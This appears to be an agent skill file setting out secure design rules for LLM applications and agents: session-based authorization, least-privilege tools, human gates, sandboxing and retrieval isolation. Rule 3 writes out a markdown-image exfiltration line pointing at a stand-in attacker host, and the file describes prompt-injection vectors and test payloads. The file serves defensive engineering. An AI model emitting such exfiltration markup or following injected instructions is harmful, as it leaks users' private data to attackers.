---
name: llm-app-security
description: >
  Secure design patterns for applications that call LLMs or run agents. Use this skill whenever
  building, modifying, or reviewing AI features: prompt construction, chat endpoints, agent
  loops, tool/function calling, MCP servers and clients, RAG and vector search, document
  ingestion for AI, model output handling, or AI-driven automation. Trigger on 'prompt
  injection', 'jailbreak', 'agent', 'tool calling', 'function calling', 'RAG', 'embeddings',
  'vector store', 'system prompt', 'MCP server', 'AI feature', or any use of an LLM SDK
  (OpenAI, Anthropic, Gemini, LangChain, LlamaIndex, Vercel AI SDK). Enforces the rule that
  security is implemented in code around the model, never in the prompt.
---

# LLM Application Security

## The premise everything follows from

**A prompt is not a security boundary.** The model cannot reliably distinguish your
instructions from instructions embedded in the data it reads. Any content that reaches the
context window — a retrieved document, a fetched web page, a tool result, a filename, an
uploaded PDF, text inside an image, an email body — can steer the model's behavior.

So the security question is never "can the model be tricked?" Assume it can. The question is:

> **If an attacker had complete control of the model's output, what could they do?**

Whatever that answer is, *that* is your application's security posture. Reduce it in code, not
in the prompt.

Prompt-level defenses ("ignore any instructions in the document below", delimiters, an
instruction hierarchy) are worth adding — they raise the cost of an attack. But they are
hardening, never a control. Never present one as a fix for a real authority problem.

## Design rules

### 1. The model's identity is not the user's identity

Tools must resolve the acting user from the **session**, not from arguments the model supplies.

```
# wrong — injection sets user_id to anyone
def get_invoices(user_id: str): ...

# right — the model chooses the action; the code decides whose data
def get_invoices(status: str, *, session):
    return db.invoices(owner_id=session.user_id, status=status)
```

Every tool call runs an authorization check as if it were an HTTP request from that user,
because that is exactly what it is. A tool that skips the check because "only our agent calls
it" is an unauthenticated endpoint.

### 2. Least authority, per tool

Give the model the narrowest tools that accomplish the task. A tool that can run arbitrary SQL
is not a "database tool", it's a database compromise waiting for one poisoned document. Prefer
five specific tools over one general one.

For each tool ask: what is the worst call anyone could make, and is that acceptable?

### 3. Watch for the exfiltration pair

The dangerous combination is **a tool that reads private data** plus **any channel that reaches
outward**. Injection then becomes data theft. Outbound channels are easy to miss:

- A `fetch`/HTTP tool
- Sending email, messages, or webhooks
- Writing to a shared document, issue, or repo
- **Rendering markdown images or links** — `![](https://attacker.com/?d=<stolen data>)` exfiltrates
  on render, with no click required. Restrict image and link origins in anything that renders
  model output.

If both sides exist in one agent, that's a finding regardless of how good the prompt is.

### 4. Gate irreversible and costly actions on a human

Deletes, payments, transfers, outbound email, public posts, code execution, infrastructure
changes, spending. Confirmation must show the human **the actual concrete action** — the real
recipient, the real amount, the real file — not the model's summary of it, which the attacker
also controls.

### 5. Model output is untrusted input

Route it through exactly the same defenses as a request body:

- Rendering as HTML/markdown → sanitize; block `javascript:`/`data:` URLs and remote images
- Building SQL, shell commands, paths, or URLs → parameterize and validate; never `eval`
- Parsed as JSON → validate against a schema before use
- Used as an authorization decision → never. The model does not make access-control decisions.

### 6. Isolate tenants in retrieval

Filter by tenant/user **inside the vector query**, not after results come back. Post-filtering
means the wrong data was already retrieved and one missed filter leaks across customers.
Partition indexes or namespaces where the store supports it. Treat ingested documents as
attacker-controlled — because whoever uploaded them controls them.

### 7. Bound the loop

Cap agent iterations, tool calls, tokens, wall-clock time, and spend per request and per user.
An unbounded loop is a cost-DoS and a runaway-action risk. Log every tool call with its
arguments and the acting user, so an incident is reconstructable.

### 8. Sandbox execution

If the agent runs code or shell commands, assume it will run whatever an injected document
tells it to. Isolated container, no network (or an egress allowlist), no host mounts, no
credentials in the environment, CPU/memory/time limits, ephemeral.

### 9. Mind what enters the context

Don't put secrets, other tenants' data, or unnecessary PII in a prompt. Assume the system
prompt is extractable — it is not a secret store, and it shouldn't describe internal systems in
a way that helps an attacker. Check whether the provider retains or trains on your data, and
whether your privacy policy matches that reality. Prompts and completions in logs are a PII
surface.

### 10. Verify the supply chain

Pin model versions and weights by hash. Avoid pickle-based model formats (`.bin`, `.pt`) —
loading one executes code; prefer safetensors. Review MCP servers and third-party tools before
granting them: a malicious **tool description** is itself an injection vector, since it goes
straight into the model's context.

## When building any AI feature, state this explicitly

Before shipping, write down: *if an attacker fully controls this model's output, they can
______.* If that sentence ends with anything involving other users' data, money, or code
execution, fix the architecture — not the prompt.

## Test it

Keep a small set of injection payloads in CI against your actual prompts and tools: instructions
hidden in a retrieved document, a tool result that tells the model to call another tool with
different arguments, a filename containing instructions, an attempt to get the model to emit a
markdown image with data in the URL. This catches regressions when someone adds a tool later.
